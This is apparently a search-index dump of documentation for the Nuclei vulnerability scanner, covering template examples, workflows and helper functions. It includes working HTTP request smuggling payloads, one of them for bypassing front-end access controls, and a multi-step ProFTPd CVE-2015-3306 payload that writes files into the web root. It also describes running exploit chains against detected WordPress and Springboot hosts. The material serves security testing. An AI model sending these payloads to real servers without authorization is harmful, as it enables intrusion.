10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"Multiple RAW request"},{"location":"template-examples/http-smuggling/","text":"Basic CL.TE \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : CL-TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")' Basic TE.CL \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : TE-CL-http-smuggling info : name : HTTP request smuggling, basic TE.CL vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")' Frontend bypass CL.TE \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : smuggling-bypass-front-end-controls-cl-te info : name : HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"/admin/delete?username=carlos\")' Differential responses based CL.TE \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : confirming-cl-te-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a CL.TE vulnerability via differential responses author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X unsafe : true matchers : - type : dsl dsl : - 'status_code==404' Differential responses based TE.CL \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : confirming-te-cl-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a TE.CL vulnerability via differential responses author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Unsafe HTTP"},{"location":"template-examples/http-smuggling/#basic-clte","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : CL-TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")'","title":"Basic CL.TE"},{"location":"template-examples/http-smuggling/#basic-tecl","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : TE-CL-http-smuggling info : name : HTTP request smuggling, basic TE.CL vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")'","title":"Basic TE.CL"},{"location":"template-examples/http-smuggling/#frontend-bypass-clte","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : smuggling-bypass-front-end-controls-cl-te info : name : HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"/admin/delete?username=carlos\")'","title":"Frontend bypass CL.TE"},{"location":"template-examples/http-smuggling/#differential-responses-based-clte","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : confirming-cl-te-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a CL.TE vulnerability via differential responses author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Differential responses based CL.TE"},{"location":"template-examples/http-smuggling/#differential-responses-based-tecl","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : confirming-te-cl-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a TE.CL vulnerability via differential responses author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Differential responses based TE.CL"},{"location":"template-examples/http/","text":"Basic Template \u00b6 This template requests / path of URL and match string in the response. id : basic-example info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word words : - \"This is test matcher text\" Multiple matchers \u00b6 This template requests / path of URL and run multiple OR based matchers against response. id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header Matchers with conditions \u00b6 This template requests / path of URL and runs two matchers, one with AND conditions with string match in header and another matcher against response body. id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body Multiple matcher conditions \u00b6 This template requests / path of URL and runs two matchers with AND conditions, one with OR conditions with string match in header and another matcher against response body, both condition has to be true in order to match this template. id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body Custom headers \u00b6 This template requests / path of the URL as GET request with additional custom headers defined in the template. id : custom-headers info : name : Test HTTP Template author : pdteam severity : info http : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - \"{{BaseURL}}/server-status\" matchers : - type : word words : - Apache Server Status - Server Version condition : and POST requests \u00b6 This template makes POST request to /admin endpoint with defined data as body parameter in the template. id : post-request info : name : Test HTTP Template author : pdteam severity : info http : - method : POST path : - \"{{BaseURL}}/admin\" body : 'admin=test' matchers : - type : word words : - Welcome Admin Time based Matcher \u00b6 This template is example of DSL based duration matcher that returns true when the response time matched the defined duration, in this case 6 or more than 6 seconds. id : time-based-matcher info : name : DSL based response time matcher author : pdteam severity : none http : - raw : - | GET /slow HTTP/1.1 matchers : - type : dsl dsl : - 'duration>=6'","title":"Base HTTP"},{"location":"template-examples/http/#basic-template","text":"This template requests / path of URL and match string in the response. id : basic-example info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word words : - \"This is test matcher text\"","title":"Basic Template"},{"location":"template-examples/http/#multiple-matchers","text":"This template requests / path of URL and run multiple OR based matchers against response. id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header","title":"Multiple matchers"},{"location":"template-examples/http/#matchers-with-conditions","text":"This template requests / path of URL and runs two matchers, one with AND conditions with string match in header and another matcher against response body. id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body","title":"Matchers with conditions"},{"location":"template-examples/http/#multiple-matcher-conditions","text":"This template requests / path of URL and runs two matchers with AND conditions, one with OR conditions with string match in header and another matcher against response body, both condition has to be true in order to match this template. id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body","title":"Multiple matcher conditions"},{"location":"template-examples/http/#custom-headers","text":"This template requests / path of the URL as GET request with additional custom headers defined in the template. id : custom-headers info : name : Test HTTP Template author : pdteam severity : info http : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - \"{{BaseURL}}/server-status\" matchers : - type : word words : - Apache Server Status - Server Version condition : and","title":"Custom headers"},{"location":"template-examples/http/#post-requests","text":"This template makes POST request to /admin endpoint with defined data as body parameter in the template. id : post-request info : name : Test HTTP Template author : pdteam severity : info http : - method : POST path : - \"{{BaseURL}}/admin\" body : 'admin=test' matchers : - type : word words : - Welcome Admin","title":"POST requests"},{"location":"template-examples/http/#time-based-matcher","text":"This template is example of DSL based duration matcher that returns true when the response time matched the defined duration, in this case 6 or more than 6 seconds. id : time-based-matcher info : name : DSL based response time matcher author : pdteam severity : none http : - raw : - | GET /slow HTTP/1.1 matchers : - type : dsl dsl : - 'duration>=6'","title":"Time based Matcher"},{"location":"template-examples/network/","text":"Basic Network Request \u00b6 This template connects to a network service, sends some data and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is PONG . id : basic-network-request info : name : Basic Network Request author : pdteam severity : info tcp : - host : - \"{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\" TLS Network Request \u00b6 Similar to the above template, but the connection to the service is done with TLS enabled. id : basic-tls-network-request info : name : Basic TLS Network Request author : pdteam severity : info tcp : - host : - \"tls://{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\" Hex Input Request \u00b6 This template connects to a network service, sends some data encoded in hexadecimal to the server and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is PONG . The match words here are encoded in Hexadecimal, using encoding: hex option of matchers. id : hex-network-request info : name : Hex Input Network Request author : pdteam severity : info tcp : - host : - \"{{Hostname}}\" inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" read-size : 4 matchers : - type : word part : data encoding : hex words : - \"504f4e47\" Input Expressions \u00b6 Inputs specified in network also support DSL Helper Expressions, so you can create your own complex inputs using variety of nuclei helper functions. The below template is an example of using hex_decode function to send decoded input over wire. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle tcp : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" Multi-Step Requests \u00b6 This last example is an RCE in proFTPd which, if vulnerable, allows placing arbitrary files in any directory on the server. The detection process involves a random string on each nuclei run using {{randstr}} , and sending multiple lines of FTP input to the vulnerable server. At the end, a successful match is detected with the presence of Copy successful in the response. id : CVE-2015-3306 info : name : ProFTPd RCE author : pd-team severity : high reference : https://github.com/t0kx/exploit-CVE-2015-3306 tags : cve,cve2015,ftp,rce tcp : - inputs : - data : \"site cpfr /proc/self/cmdline\\r\\n\" read : 1024 - data : \"site cpto /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpfr /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpto /var/www/html/{{randstr}}\\r\\n\" host : - \"{{Hostname}}\" read-size : 1024 matchers : - type : word words : - \"Copy successful\"","title":"Network"},{"location":"template-examples/network/#basic-network-request","text":"This template connects to a network service, sends some data and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is PONG . id : basic-network-request info : name : Basic Network Request author : pdteam severity : info tcp : - host : - \"{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\"","title":"Basic Network Request"},{"location":"template-examples/network/#tls-network-request","text":"Similar to the above template, but the connection to the service is done with TLS enabled. id : basic-tls-network-request info : name : Basic TLS Network Request author : pdteam severity : info tcp : - host : - \"tls://{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\"","title":"TLS Network Request"},{"location":"template-examples/network/#hex-input-request","text":"This template connects to a network service, sends some data encoded in hexadecimal to the server and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is PONG . The match words here are encoded in Hexadecimal, using encoding: hex option of matchers. id : hex-network-request info : name : Hex Input Network Request author : pdteam severity : info tcp : - host : - \"{{Hostname}}\" inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" read-size : 4 matchers : - type : word part : data encoding : hex words : - \"504f4e47\"","title":"Hex Input Request"},{"location":"template-examples/network/#input-expressions","text":"Inputs specified in network also support DSL Helper Expressions, so you can create your own complex inputs using variety of nuclei helper functions. The below template is an example of using hex_decode function to send decoded input over wire. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle tcp : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\"","title":"Input Expressions"},{"location":"template-examples/network/#multi-step-requests","text":"This last example is an RCE in proFTPd which, if vulnerable, allows placing arbitrary files in any directory on the server. The detection process involves a random string on each nuclei run using {{randstr}} , and sending multiple lines of FTP input to the vulnerable server. At the end, a successful match is detected with the presence of Copy successful in the response. id : CVE-2015-3306 info : name : ProFTPd RCE author : pd-team severity : high reference : https://github.com/t0kx/exploit-CVE-2015-3306 tags : cve,cve2015,ftp,rce tcp : - inputs : - data : \"site cpfr /proc/self/cmdline\\r\\n\" read : 1024 - data : \"site cpto /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpfr /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpto /var/www/html/{{randstr}}\\r\\n\" host : - \"{{Hostname}}\" read-size : 1024 matchers : - type : word words : - \"Copy successful\"","title":"Multi-Step Requests"},{"location":"template-examples/workflow/","text":"Generic workflows \u00b6 A generic workflow that runs two templates, one to detect Jira and another to detect Confluence. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/jira-detect.yaml - template : technologies/confluence-detect.yaml Basic conditional workflows \u00b6 A condition based workflow, which first tries to detect if springboot is running on a target. If springboot is found, a list of exploits executed against it. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : security-misconfiguration/springboot-detect.yaml subtemplates : - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2020-5410.yaml - template : vulnerabilities/springboot-actuators-jolokia-xxe.yaml - template : vulnerabilities/springboot-h2-db-rce.yaml Multi condition workflows \u00b6 This template demonstrates nested workflows with nuclei, where there's multiple levels of chaining of templates. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows with matcher \u00b6 This template detects if WordPress is running on an input host, and if found a set of targeted exploits and CVEs are executed against it. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : wordpress subtemplates : - template : cves/CVE-2019-6715.yaml - template : cves/CVE-2019-9978.yaml - template : files/wordpress-db-backup.yaml - template : files/wordpress-debug-log.yaml - template : files/wordpress-directory-listing.yaml - template : files/wordpress-emergency-script.yaml - template : files/wordpress-installer-log.yaml - template : files/wordpress-tmm-db-migrate.yaml - template : files/wordpress-user-enumeration.yaml - template : security-misconfiguration/wordpress-accessible-wpconfig.yaml - template : vulnerabilities/sassy-social-share.yaml - template : vulnerabilities/w3c-total-cache-ssrf.yaml - template : vulnerabilities/wordpress-duplicator-path-traversal.yaml - template : vulnerabilities/wordpress-social-metrics-tracker.yaml - template : vulnerabilities/wordpress-wordfence-xss.yaml - template : vulnerabilities/wordpress-wpcourses-info-disclosure.yaml Multiple Matcher workflow \u00b6 Very similar to the last example, with multiple matcher names. id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - tags : vbulletin - name : jboss subtemplates : - tags : jboss","title":"Workflow"},{"location":"template-examples/workflow/#generic-workflows","text":"A generic workflow that runs two templates, one to detect Jira and another to detect Confluence. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/jira-detect.yaml - template : technologies/confluence-detect.yaml","title":"Generic workflows"},{"location":"template-examples/workflow/#basic-conditional-workflows","text":"A condition based workflow, which first tries to detect if springboot is running on a target. If springboot is found, a list of exploits executed against it. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : security-misconfiguration/springboot-detect.yaml subtemplates : - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2020-5410.yaml - template : vulnerabilities/springboot-actuators-jolokia-xxe.yaml - template : vulnerabilities/springboot-h2-db-rce.yaml","title":"Basic conditional workflows"},{"location":"template-examples/workflow/#multi-condition-workflows","text":"This template demonstrates nested workflows with nuclei, where there's multiple levels of chaining of templates. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml","title":"Multi condition workflows"},{"location":"template-examples/workflow/#conditional-workflows-with-matcher","text":"This template detects if WordPress is running on an input host, and if found a set of targeted exploits and CVEs are executed against it. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : wordpress subtemplates : - template : cves/CVE-2019-6715.yaml - template : cves/CVE-2019-9978.yaml - template : files/wordpress-db-backup.yaml - template : files/wordpress-debug-log.yaml - template : files/wordpress-directory-listing.yaml - template : files/wordpress-emergency-script.yaml - template : files/wordpress-installer-log.yaml - template : files/wordpress-tmm-db-migrate.yaml - template : files/wordpress-user-enumeration.yaml - template : security-misconfiguration/wordpress-accessible-wpconfig.yaml - template : vulnerabilities/sassy-social-share.yaml - template : vulnerabilities/w3c-total-cache-ssrf.yaml - template : vulnerabilities/wordpress-duplicator-path-traversal.yaml - template : vulnerabilities/wordpress-social-metrics-tracker.yaml - template : vulnerabilities/wordpress-wordfence-xss.yaml - template : vulnerabilities/wordpress-wpcourses-info-disclosure.yaml","title":"Conditional workflows with matcher"},{"location":"template-examples/workflow/#multiple-matcher-workflow","text":"Very similar to the last example, with multiple matcher names. id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - tags : vbulletin - name : jboss subtemplates : - tags : jboss","title":"Multiple Matcher workflow"},{"location":"templating-guide/","text":"Templating Guide \u00b6 Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human-readable format to quickly define the execution process. Guide to write your own nuclei template - Template Details \u00b6 Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with YAML extension. The template files can be created any text editor of your choice. id : git-config ID must not contain spaces. This is done to allow easier output parsing. Information \u00b6 Next important piece of information about a template is the info block. Info block provides name , author , severity , description , reference , tags and metadata . It also contains severity field which indicates the severity of the template, info block also supports dynamic fields, so one can define N number of key: value blocks to provide more useful information about the template. reference is another popular tag to define external reference links for the template. Another useful tag to always add in info block is tags . This allows you to set some custom tags to a template, depending on the purpose like cve , rce etc. This allows nuclei to identify templates with your input tags and only run them. Example of an info block - info : name : Git Config File Detection Template author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. reference : https://www.acunetix.com/vulnerabilities/web/git-repository-found/ tags : git,config Actual requests and corresponding matchers are placed below the info block, and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired requests are made to the target sites. The best part of this is you can simply share your crafted template with your teammates, triage/security team to replicate the issue on the other side with ease. Metadata \u00b6 It's possible to add metadata nodes, for example, to integrates with uncover (cf. Uncover Integration ). The metadata nodes are crafted this way: <engine>-query: '<query>' where: <engine> is the search engine, equivalent of the value of the -ue option of nuclei or the -e option of uncover <query> is the search query, equivalent of the value of the -uq option of nuclei or the -q option of uncover For example for Shodan: info: metadata: shodan-query: 'vuln:CVE-2021-26855' Note While creating a template, it's important to include the following mandatory fields: id , name , authors and severity . If these mandatory fields are missing, then Nuclei will not proceed with such templates. By following these guidelines, you can ensure that your templates are properly formatted and ready to be used with Nuclei.","title":"Introduction"},{"location":"templating-guide/#templating-guide","text":"Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human-readable format to quickly define the execution process. Guide to write your own nuclei template -","title":"Templating Guide"},{"location":"templating-guide/#template-details","text":"Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with YAML extension. The template files can be created any text editor of your choice. id : git-config ID must not contain spaces. This is done to allow easier output parsing.","title":"Template Details"},{"location":"templating-guide/#information","text":"Next important piece of information about a template is the info block. Info block provides name , author , severity , description , reference , tags and metadata . It also contains severity field which indicates the severity of the template, info block also supports dynamic fields, so one can define N number of key: value blocks to provide more useful information about the template. reference is another popular tag to define external reference links for the template. Another useful tag to always add in info block is tags . This allows you to set some custom tags to a template, depending on the purpose like cve , rce etc. This allows nuclei to identify templates with your input tags and only run them. Example of an info block - info : name : Git Config File Detection Template author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. reference : https://www.acunetix.com/vulnerabilities/web/git-repository-found/ tags : git,config Actual requests and corresponding matchers are placed below the info block, and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired requests are made to the target sites. The best part of this is you can simply share your crafted template with your teammates, triage/security team to replicate the issue on the other side with ease.","title":"Information"},{"location":"templating-guide/#metadata","text":"It's possible to add metadata nodes, for example, to integrates with uncover (cf. Uncover Integration ). The metadata nodes are crafted this way: <engine>-query: '<query>' where: <engine> is the search engine, equivalent of the value of the -ue option of nuclei or the -e option of uncover <query> is the search query, equivalent of the value of the -uq option of nuclei or the -q option of uncover For example for Shodan: info: metadata: shodan-query: 'vuln:CVE-2021-26855' Note While creating a template, it's important to include the following mandatory fields: id , name , authors and severity . If these mandatory fields are missing, then Nuclei will not proceed with such templates. By following these guidelines, you can ensure that your templates are properly formatted and ready to be used with Nuclei.","title":"Metadata"},{"location":"templating-guide/helper-functions/","text":"Helper functions \u00b6 Here is the list of all supported helper functions can be used in the RAW requests / Network requests. Helper function Description Example Output aes_gcm(key, plaintext interface{}) []byte AES GCM encrypts a string with key {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}} ec183a153b8e8ae7925beed74728534b57a60920c0b009eaa7608a34e06325804c096d7eebccddea3e5ed6c4 base64(src interface{}) string Base64 encodes a string base64(\"Hello\") SGVsbG8= base64_decode(src interface{}) []byte Base64 decodes a string base64_decode(\"SGVsbG8=\") Hello base64_py(src interface{}) string Encodes string to base64 like python (with new lines) base64_py(\"Hello\") SGVsbG8=\\n bin_to_dec(binaryNumber number | string) float64 Transforms the input binary number into a decimal format bin_to_dec(\"0b1010\") bin_to_dec(1010) 10 compare_versions(versionToCheck string, constraints ...string) bool Compares the first version argument with the provided constraints compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1') true concat(arguments ...interface{}) string Concatenates the given number of arguments to form a string concat(\"Hello\", 123, \"world) Hello123world contains(input, substring interface{}) bool Verifies if a string contains a substring contains(\"Hello\", \"lo\") true contains_all(input interface{}, substrings ...string) bool Verifies if any input contains all of the substrings contains(\"Hello everyone\", \"lo\", \"every\") true contains_any(input interface{}, substrings ...string) bool Verifies if an input contains any of substrings contains(\"Hello everyone\", \"abc\", \"llo\") true date_time(dateTimeFormat string, optionalUnixTime interface{}) string Returns the formatted date time using simplified or go style layout for the current or the given unix time date_time(\"%Y-%M-%D %H:%m\") date_time(\"%Y-%M-%D %H:%m\", 1654870680) date_time(\"2006-01-02 15:04\", unix_time()) 2022-06-10 14:18 dec_to_hex(number number | string) string Transforms the input number into hexadecimal format dec_to_hex(7001)\" 1b59 ends_with(str string, suffix ...string) bool Checks if the string ends with any of the provided substrings ends_with(\"Hello\", \"lo\") true generate_java_gadget(gadget, cmd, encoding interface{}) string Generates a Java Deserialization Gadget generate_java_gadget(\"dns\", \"{{interactsh-url}}\", \"base64\") 